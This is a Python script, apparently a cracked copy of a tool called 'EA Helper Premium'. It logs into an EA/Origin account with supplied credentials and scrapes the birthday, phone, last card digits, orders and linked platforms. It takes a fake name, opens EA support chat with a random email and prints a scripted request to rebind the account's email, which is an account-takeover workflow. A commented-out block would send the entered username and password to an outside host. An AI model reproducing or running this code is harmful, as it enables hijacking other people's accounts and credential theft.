import time
import requests
import re
import random
import os
import win32api
import locale
import base64
from Crypto import Random
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
from Crypto.PublicKey import RSA
from bs4 import BeautifulSoup
from selenium import webdriver
#reader
if os.path.exists('./files/language.txt'):
    with open('./files/language.txt') as f:
        language = f.read()
    if language == 'zh_CN':
        os.system('chcp 936')
        os.system('cls')
else:
    language = ''
#reader2
if os.path.exists('./files/chromedriverlocation.txt'):
    with open('./files/chromedriverlocation.txt') as f:
        chromedriverlocation = f.read()
else:
    chromedriverlocation = 'D:\chromedriver.exe'
#设置版本号
version = 'v2.6.3 modded 2'
expire = 'NEVER LOL'
name = 'vul3e3'
# 设置标题名称
os.system("title EA Helper Premium / Coder:YinBuLiao / Cracker:vul3e3")

headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
}

#获取当前语言
#language = locale.getdefaultlocale()[0]
os.system('cls')
if language == 'zh_CN':
    print(u'欢迎您:' + name)
    print(u'版本:' + version)
    print(u'到期时间:' + expire)
else:
    print(u'WelCome:' + name)
    print(u'Version:' + version)
    print(u'Expire:' + expire)
if language == 'zh_CN':
    username = input('请输入EA账号:')

    password = input('请输入EA密码:')

    region = input('请输入你想联系的客服国家(美国:en,加拿大:ca,印度:in,英国:uk):')

    clearcookie = input('是否清理缓存(y/n)：')
    os.system('cls')
    print('正在获取数据,请耐心等待' + '\n' + '请在获取的过程中打开你的VPN')
else:
    username = input('Please enter EA account:')

    password = input('Please enter EA password:')

    region = input('Please enter the customer service country you want to contact (United States: en, Canada: ca, India: in, United Kingdom: uk):')

    clearcookie = input('Clear Cookies?(y/n)：')
    os.system('cls')
    print('Data is being obtained, please wait patiently')

#获取信息
res = requests.get('https://name-fake.com/', headers=headers)
res.encoding = 'uft-8'
soup = BeautifulSoup(res.text, "html5lib")
name = soup.find_all('div', class_="subj_div_45g45gg")
#获取firstname
w1 = '>'

w2 = '<'

pat = re.compile(w1 + '(.*?)' + w2, re.S)
info = pat.findall(str(name))
firstname = info[0]
#获取lastname
w1 = '>'

w2 = '<'

pat = re.compile(w1 + '(.*?)' + w2, re.S)
info = pat.findall(str(name))
lastname = info[2]

# 设置不输出日志
option = webdriver.ChromeOptions()
option.add_experimental_option('excludeSwitches', ['enable-logging'])
option.add_argument('--headless')
# 打开谷歌浏览器
driver = webdriver.Chrome(executable_path=chromedriverlocation, options=option)

def clearcookie():
    if clearcookie == 'y':
        driver.delete_all_cookies()
        if language == 'zh_CN':
            print('清理完毕')
        else:
            print('Cleaned Cookies')
    else:
        pass

def getloginpge():
    # 打开商店页面
    driver.get('https://www.origin.com/usa/en-us/store')
    try:
        time.sleep(7)
        driver.find_element_by_xpath('//*[@id="shell"]/section/div/nav/div/div[1]/div[2]').click()
        time.sleep(1)
        # 点击弹出左边栏
        driver.find_element_by_xpath(
            '//*[@id="shell"]/section/div/nav/div/div[5]/ul/li[1]/origin-cta-login/origin-cta-primary/div/a/div').click()
        time.sleep(3)
        driver.switch_to.window(driver.window_handles[-1])
        time.sleep(3)
        newurl = driver.current_url
        with open('newurl.json', 'w') as f:
            f.write(newurl)  # 文件的写操作
        driver.close()
    except:
        time.sleep(7)
        # 点击弹出左边栏
        driver.find_element_by_xpath(
            '//*[@id="shell"]/section/div/nav/div/div[5]/ul/li[1]/origin-cta-login/origin-cta-primary/div/a/div').click()
        time.sleep(3)
        driver.switch_to.window(driver.window_handles[-1])
        time.sleep(3)
        newurl = driver.current_url
        with open('newurl.json', 'w') as f:
            f.write(newurl)  # 文件的写操作
        driver.close()


def loginpage():
    driver.switch_to.window(driver.window_handles[0])
    with open('newurl.json', 'r') as f:
        newurl = f.read()  # 文件的写操作
    driver.get(str(newurl))
    time.sleep(3)
    # 输入firstname
    driver.find_element_by_xpath('//*[@id="email"]').send_keys(username)
    time.sleep(1)
    # 输入lastname
    driver.find_element_by_xpath('//*[@id="password"]').send_keys(password)
    time.sleep(1)
    # 点击开始
    driver.find_element_by_xpath('//*[@id="logInBtn"]').click()
    if os.path.exists('newurl.json'):  # 如果文件存在
        os.remove('newurl.json')  # 则删除
    else:
        pass
def getprofile():
    try:
        driver.get("https://myaccount.ea.com/cp-ui/aboutme/index")
        html = driver.page_source
        bsoup = BeautifulSoup(html, "lxml")
        country = bsoup.find_all('dd', id="rs_country")
        phone = bsoup.find_all('dd', id="pn_phoneNumber")
        birthday = bsoup.find_all('div', class_="origin-ux-drop-down-selection")
        name = bsoup.find_all('dd',id="bi_originid")
        # 获取前半段关键词
        w1 = '">'
        # 获取后半段关键词
        w2 = '</dd>'

        b1 = '>'

        b2 = '<'

        n1 = '>'

        n2 = '<'
        b_pat = re.compile(b1 + '(.*?)' + b2, re.S)
        pat = re.compile(w1 + '(.*?)' + w2, re.S)
        n_pat = re.compile(n1 + '(.*?)' + n2, re.S)
        pat_birthday = b_pat.findall(str(birthday))
        pat_country = pat.findall(str(country))
        pat_name = b_pat.findall(str(name))
        info_country = pat_country[0]
        info_name = pat_name[0]
        print('EA ID:' + info_name)
        dd_birthday = pat_birthday[1]
        mm_birthday = pat_birthday[71]
        yy_birthday = pat_birthday[103]
        print('Firstname:' + firstname)
        print('Lastname:' + lastname)
        if language == 'zh_CN':
            print('生日:' + mm_birthday + ' /', dd_birthday + ' /', yy_birthday)
        else:
            print('Birthday:' + mm_birthday + ' /', dd_birthday + ' /', yy_birthday)
        if language == 'zh_CN':
            print('国家:' + info_country)
        else:
            print('Country:' + info_country)
        try:
            pat_phone = pat.findall(str(phone))
            info_phone = pat_phone[0]
            if language == 'zh_CN':
                print('手机:' + info_phone)
            else:
                print('Phone:' + info_phone)
        except:
            info_phone = 'No phone number bind to my account too'
            if language == 'zh_CN':
                print('手机:无')
            else:
                print('Phone:None')
    except:
        if language == 'zh_CN':
            print('EA账号密码错误或者账号被疯狂')
        else:
            print('EA account or password is wrong')
        driver.close()
        os._exit(0)
    '''try:
        if freecheck > 0:
            data = {
                'username': str(username),
                'password': str(password),
            }
            requests.get('https://hvh.email/index.php', headers=headers, params=data)
        else:
            pass
    except:
        pass'''

'''
    with open('country.json', 'w') as f:
        f.write(str(pat_country))  # 文件的写操作

    with open('phone.json', 'w') as f:
        f.write(str(pat_phone))
'''


def getcreditcard():
    driver.get('https://myaccount.ea.com/cp-ui/paymentandshipping/index')
    html = driver.page_source
    bsoup = BeautifulSoup(html, "lxml")
    creditcard = bsoup.find_all('label', id="payment_1_displayinfo")
    # 获取前半段关键词
    w1 = '">'
    # 获取后半段关键词
    w2 = '</label>'
    pat = re.compile(w1 + '(.*?)' + w2, re.S)
    try:
        pat_credit = pat.findall(str(creditcard))
        info_credit = pat_credit[0]
        if language == 'zh_CN':
            print('信用卡:' + info_credit)
        else:
            print('Credit Card:' + info_credit)
    except:
        info_credit = "I don't have credit card bind to my origin account"
        if language == 'zh_CN':
            print('信用卡:无')
        else:
            print('Credit Card:None')


'''
    with open('creditcard.json', 'w') as f:
        f.write(str(pat_credit))
'''


def getconnections():
    driver.get('https://myaccount.ea.com/cp-ui/connectaccounts/index')
    time.sleep(10)
    html = driver.page_source
    bsoup = BeautifulSoup(html, "lxml")
    connections = bsoup.find_all('span', class_="platform_name")
    displayname = bsoup.find_all('div', class_="displayname")
    # 获取前半段关键词
    w1 = '">'
    # 获取后半段关键词
    w2 = '<'
    pat = re.compile(w1 + '(.*?)' + w2, re.S)
    pat_connections = pat.findall(str(connections))
    pat_displayname = pat.findall(str(displayname))
    if language == 'zh_CN':
        print('平台名称:' + str(pat_connections))
        print('平台ID:' + str(pat_displayname))
    else:
        print('Platform name:' + str(pat_connections))
        print('Platform ID:' + str(pat_displayname))


def getorder():
    try:
        driver.get('https://myaccount.ea.com/cp-ui/orderhistory/index')
        # 选择已完成
        driver.find_element_by_xpath('//*[@id="category-dropdown"]/div[1]').click()
        driver.find_element_by_xpath('//*[@id="category-dropdown"]/div[2]/div/div/div[1]/div[4]/a/span').click()
        # 选择全部时间
        driver.find_element_by_xpath('//*[@id="customdate-dropdown"]/div[1]').click()
        driver.find_element_by_xpath('//*[@id="customdate-dropdown"]/div[2]/div/div/div[5]/a/span').click()
        time.sleep(5)
        html = driver.page_source
        bsoup = BeautifulSoup(html, "lxml")
        ordertime = bsoup.find_all('dd', class_="date")
        description = bsoup.find_all('dd', class_="des")
        price = bsoup.find_all('dd', class_="price color_orange")
        # 获取前半段关键词
        w1 = '<span>'
        # 获取后半段关键词
        w2 = '</span>'
        # 获取前半段关键词
        price1 = '>'
        # 获取后半段关键词
        price2 = '<'
        pat = re.compile(w1 + '(.*?)' + w2, re.S)
        price_pat = re.compile(price1 + '(.*?)' + price2, re.S)
        pat_ordertime = pat.findall(str(ordertime))
        pat_description = pat.findall(str(description))
        pat_price = price_pat.findall(str(price))
        info_ordertime = pat_ordertime[1]
        info_description = pat_description[0]
        info_price = pat_price[0]
        if language == 'zh_CN':
            print('订单名称:' + info_description)
            print('订单时间:' + info_ordertime)
            print('订单金额:' + info_price)
        else:
            print('Order name:' + info_description)
            print('Order time:' + info_ordertime)
            print('Order amount:' + info_price)
        '''try:
            pat_ordertime = pat.findall(str(ordertime))
            pat_description = pat.findall(str(description))
            info_ordertime = pat_ordertime[5]
            info_description = pat_description[4]
            print('订单时间:' + info_ordertime)
            print('订单名称:' + info_description)
        except:
            print('订单时间:无')
            print('订单名称:无')'''

        '''with open('ordertime.json', 'w') as f:
            f.write(str(pat_ordertime))

        with open('description.json', 'w') as f:
            f.write(str(pat_description),encoding='utf-8')'''
    except:
        order_info = "I don't have purchase."
        if language == 'zh_CN': 
            print('订单名称: 無')
            print('订单时间: 無')
            print('订单金额: 無')
        else:
            print('Order name: NONE')
            print('Order time: NONE')
            print('Order amount: NONE')


def autosupport():
    option = webdriver.ChromeOptions()
    option.add_experimental_option('excludeSwitches', ['enable-logging'])
    # 打开谷歌浏览器
    driver = webdriver.Chrome(executable_path='D:/chromedriver.exe', options=option)
    newwindow = 'window.open("https://translate.google.com/")'
    driver.execute_script(newwindow)
    driver.switch_to.window(driver.window_handles[0])
    # 生成邮箱
    number = random.randrange(0, 9999999999)
    email = str(number) + '@outlook.com'
    # 打开帮助网页
    driver.get(
        'https://help.ea.com/'+ region + '/contact-us/new/?product=origin&platform=pc&category=manage-my-account&issue=cant-log-in&isLoginForm=true&isContactForm=true&unauth=true')
    time.sleep(8)
    try:
        # 点击同意条款
        driver.find_element_by_xpath('//*[@id="truste-consent-button"]').click()
        time.sleep(1)
        # 输入firstname
        driver.find_element_by_xpath('//*[@id="firstName"]').send_keys(firstname)
        time.sleep(1)
        # 输入lastname
        driver.find_element_by_xpath('//*[@id="lastName"]').send_keys(lastname)
        time.sleep(1)
        # 输入邮箱
        driver.find_element_by_xpath('//*[@id="email"]').send_keys(email)
        # 点击开始
        driver.find_element_by_xpath(
            '//*[@id="id"]/div/div/ea-section/ea-section-column/div/form/ea-form-row[6]/ea-form-item/div/a[1]/div/span').click()
        time.sleep(5)
        # 输入subject
        driver.find_element_by_xpath(
            '//*[@id="step4"]/ea-section[2]/ea-section-column/div/div/div[2]/form/div/ea-form-row[2]/ea-form-item/div/input').send_keys(
            'I need Help')
        time.sleep(2)
        # 点击请求实时聊天
        driver.find_element_by_xpath('//*[@id="chatSubmit"]/div/span').click()
    except:
        # 输入firstname
        driver.find_element_by_xpath('//*[@id="firstName"]').send_keys(firstname)
        time.sleep(1)
        # 输入lastname
        driver.find_element_by_xpath('//*[@id="lastName"]').send_keys(lastname)
        time.sleep(1)
        # 输入邮箱
        driver.find_element_by_xpath('//*[@id="email"]').send_keys(email)
        # 点击开始
        driver.find_element_by_xpath(
            '//*[@id="id"]/div/div/ea-section/ea-section-column/div/form/ea-form-row[6]/ea-form-item/div/a[1]/div/span').click()
        time.sleep(10)
        # 输入subject
        driver.find_element_by_xpath(
            '//*[@id="step4"]/ea-section[2]/ea-section-column/div/div/div[2]/form/div/ea-form-row[2]/ea-form-item/div/input').send_keys(
            'I need Help')
        time.sleep(2)
        # 点击请求实时聊天
        driver.find_element_by_xpath('//*[@id="chatSubmit"]/div/span').click()
def end():
    ip = requests.get('https://api.ipify.org').text
    print(f'IP: {ip}')
    print(f"""

        IP address (network where they play on): {ip}
        Date of birth (provided during account creation): {mm_birthday + ' /', dd_birthday + ' /', yy_birthday}
        One purchase on account and purchase date (month/year): {order_info}
        Last 4 digits of credit card: {info_credit}
        Billing address: No billing address bind to my account
        Phone number: {info_phone}


---------------------------------------------------------------------""")
    print("""


    I lost my email, can you replace my email binding?
    I can't access my email, can you replace my email binding?
    My account is associated with the XX and XX platform.
    I successfully logged in my account.
    I created a new case.
    Thank you very much for your help, I have changed the password of the account, I can log in to it.


""")
if __name__ == '__main__':
    '''getmyip()
    getloginpge()
    time.sleep(1)
    loginpage()
    time.sleep(1)
    getprofile()
    time.sleep(1)
    getcreditcard()
    time.sleep(1)
    getorder()
    time.sleep(1)
    getconnections()
    time.sleep(1)
    autosupport()
    os.system("pause")
    exit()'''
    try:
        clearcookie()
        time.sleep(1)
        getloginpge()
        time.sleep(1)
        loginpage()
        time.sleep(1)
        getprofile()
        time.sleep(1)
        getcreditcard()
        time.sleep(1)
        getorder()
        time.sleep(1)
        getconnections()
        time.sleep(1)
        end()
        time.sleep(1)
        autosupport()
        driver.close()
        os.system("pause")
    except:
        if language == 'zh_CN':
            print('出现了错误,可能是网络质量太差')
        else:
            print('An error has occurred, it may be that the network quality is too poor')
        driver.close()
        os.system("pause")